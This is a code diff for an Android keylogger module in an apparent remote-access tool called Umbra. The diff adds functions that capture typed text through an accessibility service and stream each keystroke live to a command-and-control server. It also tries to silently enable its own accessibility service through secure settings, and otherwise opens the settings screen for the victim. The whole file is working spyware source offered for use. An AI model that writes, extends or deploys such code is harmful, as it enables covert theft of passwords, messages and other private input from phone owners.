@@ -1,35 +1,50 @@
 package org.umbra.core.modules
 
-import android.accessibilityservice.AccessibilityService
-import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.ComponentName
 import android.content.Context
-import android.content.SharedPreferences
-import android.view.accessibility.AccessibilityEvent
+import android.content.Intent
+import android.provider.Settings
+import android.util.Log
+import org.umbra.core.c2.C2Coordinator
 import org.umbra.core.c2.Command
 import org.umbra.core.core.KeylogEntry
+import org.umbra.core.core.ResponseEnvelope
 import org.umbra.core.core.UmbraResponse
+import kotlinx.serialization.encodeToString
+import kotlinx.serialization.json.Json
 import java.io.File
 
 /**
  * AccessibilityService-based keylogger.
- * Requires the user to enable Umbra Accessibility Service in Settings.
- * Keystrokes are stored both in-memory and on-disk (encrypted via simple XOR).
  *
- * The AccessibilityService is the actual Android service component.
- * This object provides the query interface and shared storage.
+ * The UmbraAccessibilityService (declared in AndroidManifest.xml) is the actual
+ * Android component that receives TYPE_VIEW_TEXT_CHANGED events. This object:
+ *   1. Buffers captured keystrokes (memory + encrypted disk).
+ *   2. Streams each keystroke to the C2 server in real-time when streaming is on.
+ *   3. Provides the command surface (start / stop / dump / status).
  */
 object KeylogModule {
 
+    private const val TAG = "Umbra.Keylog"
     private const val MAX_BUFFER = 1000
     private const val KEYLOG_FILE = "umbra_keylog.dat"
     private val keylogBuffer = mutableListOf<KeylogEntry>()
-    private val xorKey = byteArrayOf(0x53, 0x79, 0x6E, 0x61, 0x70, 0x73, 0x65, 0x21) // "Umbra!"
+    private val xorKey = byteArrayOf(0x53, 0x79, 0x6E, 0x61, 0x70, 0x73, 0x65, 0x21) // "Synapse!"
 
-    // Tracks hasActiveSession so we know if accessibility is running
+    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }
+
+    // Tracks whether the accessibility service is connected (keylogger capturing)
     @Volatile var hasActiveSession = false
 
+    // When true, every captured keystroke is pushed to the C2 server in real-time
+    @Volatile var streamingEnabled = false
+
+    // Last captured field text per package, used by the service for delta capture
+    private val lastText = java.util.concurrent.ConcurrentHashMap<String, String>()
+
     /**
-     * Called by the AccessibilityService when a key event is captured.
+     * Called by the AccessibilityService when text is captured. Buffers it for
+     * later dump. (Streaming is handled separately via [onKeystroke].)
      */
     fun onKeyEvent(packageName: String, text: String) {
         val entry = KeylogEntry(
@@ -46,29 +61,115 @@ object KeylogModule {
         }
     }
 
+    /**
+     * Streams a single keystroke (delta text) to the C2 server in real-time.
+     * Called both from onKeyEvent and directly by the accessibility service
+     * when it has finer-grained keystroke deltas.
+     */
+    fun onKeystroke(packageName: String, typedText: String) {
+        if (!streamingEnabled) return
+        if (typedText.isBlank()) return
+        try {
+            val envelope = ResponseEnvelope(
+                type = "LiveEventResponse",
+                device_id = "",
+                cmd_id = "keylog_push",
+                status = "ok",
+                payload = UmbraResponse.LiveEventResponse(
+                    event_type = "keystroke",
+                    package_name = packageName,
+                    keylog_text = typedText,
+                    keylog_package = packageName,
+                    keylog_event = "keystroke"
+                )
+            )
+            val serialized = json.encodeToString(ResponseEnvelope.serializer(), envelope)
+            C2Coordinator.sendResult(serialized)
+        } catch (e: Exception) {
+            Log.d(TAG, "keystroke push failed: ${e.message}")
+        }
+    }
+
+    /**
+     * Tracks the previous field text for [packageName]. Returns the newly-typed
+     * characters (positive delta), or null if text was deleted/replaced.
+     */
+    fun computeTypedDelta(packageName: String, newText: String): String? {
+        val prev = lastText.put(packageName, newText) ?: return newText.ifBlank { null }
+        if (prev == newText) return null
+        // Common prefix length
+        var i = 0
+        while (i < prev.length && i < newText.length && prev[i] == newText[i]) i++
+        // Common suffix length (careful not to double-count the prefix)
+        val prevSuffix = prev.length - i
+        val newSuffix = newText.length - i
+        var s = 0
+        while (s < prevSuffix && s < newSuffix &&
+            prev[prev.length - 1 - s] == newText[newText.length - 1 - s]) s++
+        val removed = prev.substring(i, prev.length - s)
+        val added = newText.substring(i, newText.length - s)
+        return when {
+            added.isNotEmpty() && removed.isEmpty() -> added
+            added.isEmpty() && removed.isNotEmpty() -> "\u232B".repeat(removed.length) // backspace
+            added.isNotEmpty() && removed.isNotEmpty() -> "\u232B${removed.length}$added"
+            else -> null
+        }
+    }
+
     suspend fun start(context: Context, cmd: Command): UmbraResponse {
-        // Accessibility Service must be started by the system via Settings
-        // We just flag it as active
-        return try {
-            hasActiveSession = true
+        val enabled = isAccessibilityEnabled(context)
+        hasActiveSession = enabled
+        var autoEnabled = false
+        if (!enabled) {
+            // Best-effort attempt to enable via WRITE_SECURE_SETTINGS (only works
+            // if the app holds that permission, e.g. via pm grant / root). Otherwise
+            // fall back to opening the Accessibility settings screen for the user.
+            autoEnabled = tryEnableViaSecureSettings(context)
+            if (!autoEnabled) {
+                try {
+                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    context.startActivity(intent)
+                } catch (_: Exception) {}
+            }
+        }
+
+        streamingEnabled = true
+        val nowEnabled = isAccessibilityEnabled(context) || autoEnabled
+        hasActiveSession = nowEnabled
+
+        return if (nowEnabled) {
+            UmbraResponse.LiveStatusResponse(
+                status = "keylog_active",
+                monitors = mapOf("keylogger" to true)
+            )
+        } else {
             UmbraResponse.ErrorResponse(
                 "keylog:accessibility_service_must_be_enabled_in_settings",
                 "keylog"
             )
-        } catch (e: Exception) {
-            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
         }
     }
 
     suspend fun stop(context: Context, cmd: Command): UmbraResponse {
+        streamingEnabled = false
         hasActiveSession = false
-        // Persist current buffer to disk before stopping
         persistToDisk(context)
-        return try {
-            UmbraResponse.ErrorResponse("keylog:stopped", "keylog")
-        } catch (e: Exception) {
-            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
-        }
+        return UmbraResponse.LiveStatusResponse(
+            status = "keylog_stopped",
+            monitors = mapOf("keylogger" to false)
+        )
+    }
+
+    suspend fun status(context: Context, cmd: Command): UmbraResponse {
+        return UmbraResponse.LiveStatusResponse(
+            status = if (hasActiveSession) "capturing" else "idle",
+            monitors = mapOf(
+                "keylogger" to hasActiveSession,
+                "streaming" to streamingEnabled,
+                "accessibility_enabled" to isAccessibilityEnabled(context)
+            )
+        )
     }
 
     suspend fun dump(context: Context, cmd: Command): UmbraResponse {
@@ -76,7 +177,6 @@ object KeylogModule {
         val packageFilter = cmd.params["package"]
 
         return try {
-            // Merge disk + memory
             val diskEntries = loadFromDisk(context)
 
             val merged = synchronized(keylogBuffer) {
@@ -95,6 +195,62 @@ object KeylogModule {
             )
         } catch (e: Exception) {
             UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
+        }
+    }
+
+    /**
+     * Checks whether the Umbra accessibility service is enabled in Settings.
+     */
+    fun isAccessibilityEnabled(context: Context): Boolean {
+        return try {
+            val expected = ComponentName(context, UmbraAccessibilityService::class.java)
+            val enabled = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: return false
+            enabled.split(':').any { part ->
+                ComponentName.unflattenFromString(part) == expected
+            }
+        } catch (e: Exception) {
+            Log.d(TAG, "isAccessibilityEnabled: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Attempts to enable the accessibility service by writing to the secure
+     * setting directly. This requires WRITE_SECURE_SETTINGS (shell/root).
+     */
+    private fun tryEnableViaSecureSettings(context: Context): Boolean {
+        return try {
+            val component = ComponentName(context, UmbraAccessibilityService::class.java)
+                .flattenToString()
+            val current = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
+            val updated = if (current.isEmpty()) component
+            else if (current.split(':').contains(component)) current
+            else "$current:$component"
+            Settings.Secure.putString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
+                updated
+            )
+            Settings.Secure.putString(
+                context.contentResolver,
+                Settings.Secure.ACCESSIBILITY_ENABLED,
+                "1"
+            )
+            // re-check
+            val re = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
+            re.split(':').contains(component)
+        } catch (e: Exception) {
+            Log.d(TAG, "tryEnableViaSecureSettings: ${e.message}")
+            false
         }
     }
 
@@ -120,9 +276,6 @@ object KeylogModule {
         } catch (_: Exception) {}
     }
 
-    /**
-     * Load persisted entries from encrypted disk file.
-     */
     private fun loadFromDisk(context: Context): List<KeylogEntry> {
         return try {
             val file = File(context.filesDir, KEYLOG_FILE)
